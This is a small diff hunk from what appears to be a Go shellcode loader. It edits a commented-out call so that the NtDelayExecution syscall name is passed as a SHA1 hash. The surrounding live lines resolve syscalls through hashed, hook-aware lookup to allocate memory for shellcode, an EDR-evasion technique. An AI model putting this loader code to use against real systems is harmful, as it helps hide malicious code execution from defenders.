@@ -72,7 +72,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 	regionsize := uintptr(len(shellcode))
 
 	//callAddr := recycled.GetCall("",nil,nil)
-	//callAddr := recycled.GetCall("NtDelayExecution",nil,str2sha1)
+	//callAddr := recycled.GetCall(str2sha1("NtDelayExecution"),nil,str2sha1)
 	callAddr := recycled.GetCall("",hashhooked,str2sha1)
 
 	r1, r := recycled.HgSyscall(
